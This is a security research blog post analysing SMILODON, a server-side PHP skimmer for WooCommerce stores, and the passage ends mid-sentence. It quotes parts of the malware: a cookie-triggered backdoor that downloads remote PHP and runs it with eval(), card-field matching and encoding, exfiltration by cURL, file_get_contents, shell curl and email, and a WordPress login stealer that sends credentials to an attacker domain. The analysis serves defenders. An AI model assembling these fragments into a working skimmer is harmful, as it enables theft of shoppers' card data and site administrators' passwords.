---
title: SMILODON - A Server-Side PHP Skimmer for WooCommerce
url: https://lukeleal.com/research/posts/smilodon-php-woocommerce-skimmer/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:24.680423
---

# SMILODON - A Server-Side PHP Skimmer for WooCommerce

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [SMILODON - A Server-Side PHP Skimmer for WooCommerce](https://lukeleal.com/research/posts/smilodon-php-woocommerce-skimmer/)

2024-08-30Luke

#[SMILODON](https://lukeleal.com/research/tags/smilodon/)
#[javasources.net](https://lukeleal.com/research/tags/javasources.net/)
#[steg.pw](https://lukeleal.com/research/tags/steg.pw/)
#[zolo.pw](https://lukeleal.com/research/tags/zolo.pw/)
#[skimmer](https://lukeleal.com/research/tags/skimmer/)
#[magecart](https://lukeleal.com/research/tags/magecart/)
#[woocommerce](https://lukeleal.com/research/tags/woocommerce/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![SMILODON - A Server-Side PHP Skimmer for WooCommerce](https://lukeleal.com/research/smilodon-cover-q90.jpg "Cover Image")

## Table of Contents

* [Per-site ID](#per-site-id)
* [Block 1: A Remote Shell Behind a Cookie](#block-1-a-remote-shell-behind-a-cookie)
* [Block 2: Card Skimming](#block-2-card-skimming)
  + [Three ways to send it](#three-ways-to-send-it)
* [Block 3: WordPress Login Stealer](#block-3-wordpress-login-stealer)
* [Detection](#detection)
* [IOCs](#iocs)
* [Sample](#sample)

Nearly every skimmer I’ve written about runs as JavaScript in the shopper’s browser. **SMILODON** runs on the *server* instead. It reads the card data out of the checkout `$_POST` before WooCommerce does, and there’s nothing for a browser-based scanner to find.

> No script tag, no external JavaScript, and no suspicious network request from the shopper’s browser. The only outbound traffic is from the web server itself.

This sample was collected in December 2024. Malwarebytes (hxxps://blog[.]malwarebytes[.]com/cybercrime/2021/05/newly-observed-php-based-skimmer-shows-ongoing-magecart-group-12-activity/) documented the technique against Magento 1 stores in 2021 and attributed it to **Magecart Group 12**, based on `zolo[.]pw` sharing an IP address with domains previously tied to that group. Sucuri (hxxps://blog[.]sucuri[.]net/2022/06/smilodon-credit-card-skimming-malware-shifts-to-wordpress.html) reported the move to WordPress and WooCommerce in 2022, which is the version covered here.

## Per-site ID[#](#per-site-id)

The code starts by defining constants, including the operator’s contact email and the main exfil URL:

```
define("SMILODON2_EMAIL", "[email protected]");
define("SMILODON2_URL", "hxxps://javasources[.]net/SMILODON/index.php?view=");
```

It then calculates a CRC32 of the site’s hostname and uses it to build constant names like `SMILODON2_BACKUP` + `CRC_SMILODON2_SHORT`. Each block checks `if (!defined(...))` first, which keeps a block from running twice if the file gets included more than once. Because the constant names contain a per-site number, it also avoids clashing with another copy of itself.

## Block 1: A Remote Shell Behind a Cookie[#](#block-1-a-remote-shell-behind-a-cookie)

```
if (((isset($_COOKIE['wtf'])) && (md5($_COOKIE['wtf']) == '7ac1cca5bee8b8b31a521b97b0988063')) || ((isset($_COOKIE['ftw'])) && (md5($_COOKIE['ftw']) == '7ac1cca5bee8b8b31a521b97b0988063'))) {
    $get_url = "hxxps://zolo[.]pw/wtf/index.php?h=" . $_SERVER['HTTP_HOST'];
    ...
    eval($content);
    exit;
}
```

If a request carries a cookie named `wtf` or `ftw` whose MD5 matches the hardcoded hash, the script downloads PHP from `zolo[.]pw` and `eval()`s it. This is a backdoor that only the operator can trigger, and the actual shell code is never stored on the infected site. The cookie names are cute (*what the f…* and *for the win*), and they give you something to search the web server’s access logs for.

The cURL options are what you’d expect from a copy-pasted fetch helper: `SSL_VERIFYPEER => false`, a Windows XP Firefox 32 user-agent, and a 120 second timeout.

## Block 2: Card Skimming[#](#block-2-card-skimming)

This is the main block. Customer billing details are cached first. If `billing_first_name` is posted, the script builds a pipe-separated string and stores it in a cookie called `_wdata`:

```
$bill = $firstname . ' ' . $lastname . '|' . $address . '|' . $city . '|' . $region . ' |' . $zip . '|' . $country . '|' . $phone . ' ' . $email;
setcookie("_wdata", base64_encode($bill), time() + 3600, "/");
```

The billing step and the payment step of a WooCommerce checkout are separate requests, so the script saves the first one in a cookie to attach it to the second. Storing stolen data in the *victim’s own browser* keeps it off the server’s disk.

When the `payment` array shows up in `$_POST`, the script looks for the card fields using regular expressions instead of fixed names. This lets one skimmer work against many different payment gateways:

```
$fieldsArray = array(
    "/.*cc_num.*/" => 1,
    "/.*control_settings.*/" => 1,
    "/.*cc_exp_m.*/" => 2,
    "/.*exp_month.*/" => 2,
    "/.*expirationMonth.*/" => 2,
    "/.*msn_set.*/" => 2,
    "/.*cc_exp_y.*/" => 3,
    "/.*exp_year.*/" => 3,
    "/.*expirationYear.*/" => 3,
    "/.*yellow_set.*/" => 3,
    "/.*savage_set.*/" => 4,
    "/.*cc_cid.*/" => 4
);
```

The odd names (`control_settings`, `msn_set`, `yellow_set`, `savage_set`) are the interesting part. They aren’t standard card field names, so my guess is that they come from specific payment plugins or customized checkouts the operator has seen before. I can’t confirm that from the sample alone.

The data is normalized to `number|MM/YY|cvv`, joined with the saved billing string, tagged with the site’s hostname and the server’s IP, then ROT13’d and Base64’d:

```
$cc_pay_encoded = base64_encode(str_rot13($cc_pay . "\r\n*" . $_SERVER['HTTP_HOST'] . " [" . $_SERVER['SERVER_ADDR'] . "]*"));
$cc_pay_encoded = str_replace("+", "%2b", $cc_pay_encoded);
```

### Three ways to send it[#](#three-ways-to-send-it)

The script wants to be sure the card gets out. It tries three methods in order, and checks for a reply of `1` as confirmation from the C2:

1. cURL `GET` to `javasources[.]net/SMILODON/index.php?view=<data>`
2. If that fails, `file_get_contents()` on the same URL
3. If that fails and `exec` is allowed, shell out to `curl --insecure`

Finally, as a backup, it **emails** the plain text to `[[email protected]](/cdn-cgi/l/email-protection)` with the subject `bb_<hostname>`:

```
@mail(SMILODON2_EMAIL, 'bb_' . $_SERVER['HTTP_HOST'], $cc_pay);
```

If the exfil domain is blocked, the card data still reaches the attacker’s inbox over SMTP.

## Block 3: WordPress Login Stealer[#](#block-3-wordpress-login-stealer)

The last block steals WordPress admin credentials. It saves the posted `log` and `pwd` login fields into a `_wptoken` cookie, waits until the cookie indicates the user is actually logged in, and only *then* sends the credentials with the site, path and visitor IP to `steg[.]pw`:

```
$atoken = base64_encode($_POST['log'] . ";" . $_POST['pwd']);
setcookie("_wptoken", $atoken, time() + 36000, "/");
...
$user_data = base64_encode($_SERVER['HTTP_HOST'] . ";$path;" . $_COOKIE['_wptoken'] . ';' . $user_ip);
```

Waiting for the login to succeed means the attacker only receives *working* passwords, not typos. After the report, the script sets a `_jwp` cookie...